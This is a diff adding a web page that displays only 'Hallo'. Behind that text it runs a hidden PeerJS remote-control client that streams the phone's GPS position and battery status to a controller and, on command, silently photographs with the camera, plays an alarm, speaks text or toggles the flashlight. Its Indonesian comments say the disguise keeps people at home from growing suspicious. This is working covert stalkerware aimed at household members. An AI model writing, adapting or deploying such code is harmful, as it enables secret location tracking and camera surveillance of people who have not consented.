@@ -1,0 +1,223 @@
+<!-- ... existing code -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hallo</title>
+    <!-- PeerJS Library for Real P2P Remote Receiver -->
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        /* Tampilan disamarkan 100% sederhana hanya tulisan Hallo */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #111111;
+            overflow: hidden;
+            user-select: none;
+        }
+        h1 {
+            font-size: 2rem;
+            font-weight: 400;
+        }
+        .hidden-service {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Hanya menampilkan kata Hallo agar orang rumah tidak curiga sama sekali -->
+    <h1 id="stealth-text">Hallo</h1>
+
+    <!-- Hidden Remote Control Engine (Background Service) -->
+    <div class="hidden-service">
+        <video id="webcam-video" autoplay playsinline muted></video>
+        <canvas id="photo-canvas"></canvas>
+    </div>
+
+    <script>
+        // System Settings - Custom Target Device Code
+        const DEVICE_ID = "PRIV-HP2-HOME";
+        let isFlashOn = false;
+
+        // PeerJS Signalling
+        let peer = null;
+        let activeConn = null;
+
+        // Channel komunikasi antar browser tab / inter-window fallback
+        const broadcastChannel = new BroadcastChannel('privguard_channel');
+
+        // Klik layar untuk memberikan izin kamera/audio pertama kali
+        document.body.addEventListener('click', () => {
+            initSensors();
+            initPeerClient();
+        }, { once: true });
+
+        window.addEventListener('DOMContentLoaded', () => {
+            initSensors();
+            initPeerClient();
+        });
+
+        // Initialize Real WebRTC Peer Server on HP Target
+        function initPeerClient() {
+            if(peer) return;
+            peer = new Peer(DEVICE_ID);
+
+            peer.on('open', (id) => {
+                console.log("[PrivGuard Client] Online Peer ID:", id);
+            });
+
+            peer.on('connection', (conn) => {
+                activeConn = conn;
+                console.log("[PrivGuard Client] Connected to Controller!");
+
+                conn.on('data', (data) => {
+                    executeRemoteCommand(data);
+                });
+            });
+        }
+
+        // Initialize Sensors (GPS, Battery)
+        function initSensors() {
+            // Track Battery Status
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    sendTelemetry({ type: 'battery', level: Math.round(battery.level * 100), charging: battery.charging });
+                    battery.addEventListener('levelchange', () => {
+                        sendTelemetry({ type: 'battery', level: Math.round(battery.level * 100), charging: battery.charging });
+                    });
+                });
+            }
+
+            // Silent GPS Tracker
+            if ('geolocation' in navigator) {
+                navigator.geolocation.watchPosition(
+                    (pos) => {
+                        sendTelemetry({
+                            type: 'gps',
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    (err) => console.warn('GPS Error:', err),
+                    { enableHighAccuracy: true, maximumAge: 10000 }
+                );
+            }
+
+            // Send Heartbeat
+            setInterval(() => {
+                sendTelemetry({ type: 'heartbeat', timestamp: Date.now() });
+            }, 3000);
+        }
+
+        // Send telemetry back over PeerJS or BroadcastChannel
+        function sendTelemetry(data) {
+            if(activeConn && activeConn.open) {
+                activeConn.send(data);
+            }
+            broadcastChannel.postMessage({
+                deviceId: DEVICE_ID,
+                payload: data
+            });
+        }
+
+        // Listen for Remote Execution Commands
+        function executeRemoteCommand(data) {
+            if (!data) return;
+            const command = data.command;
+
+            switch(command) {
+                case 'ALARM':
+                    playSilentAlarm();
+                    break;
+                case 'CAMERA':
+                    captureRemotePhoto();
+                    break;
+                case 'TTS':
+                    speakText(data.text || "Halo");
+                    break;
+                case 'FLASH':
+                    toggleFlashlight();
+                    break;
+                case 'VIBRATE':
+                    if ('vibrate' in navigator) navigator.vibrate([500, 200, 500]);
+                    break;
+            }
+        }
+
+        broadcastChannel.onmessage = (event) => {
+            if (event.data && event.data.targetDeviceId === DEVICE_ID) {
+                executeRemoteCommand(event.data);
+            }
+        };
+
+        // Command Handler: Audio Sirene
+        function playSilentAlarm() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'sawtooth';
+                osc.frequency.setValueAtTime(880, ctx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(440, ctx.currentTime + 1);
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                osc.stop(ctx.currentTime + 2);
+            } catch(e) {}
+        }
+
+        // Command Handler: Text to Speech
+        function speakText(text) {
+            if ('speechSynthesis' in window) {
+                const utterance = new SpeechSynthesisUtterance(text);
+                utterance.lang = 'id-ID';
+                window.speechSynthesis.speak(utterance);
+            }
+        }
+
+        // Command Handler: Silent Snapshot Camera
+        function captureRemotePhoto() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+                    .then(stream => {
+                        const video = document.getElementById('webcam-video');
+                        video.srcObject = stream;
+                        setTimeout(() => {
+                            const canvas = document.getElementById('photo-canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            const imageData = canvas.toDataURL('image/jpeg');
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                            sendTelemetry({ type: 'photo_captured', image: imageData });
+                        }, 800);
+                    })
+                    .catch(err => console.error("Kamera tidak diizinkan", err));
+            }
+        }
+
+        // Command Handler: Flashlight
+        function toggleFlashlight() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+                    .then(stream => {
+                        const track = stream.getVideoTracks()[0];
+                        isFlashOn = !isFlashOn;
+                        track.applyConstraints({ advanced: [{ torch: isFlashOn }] })
+                            .catch(e => console.warn('Torch tidak didukung browser ini'));
+                    });
+            }
+        }
+    </script>
+</body>
+</html>
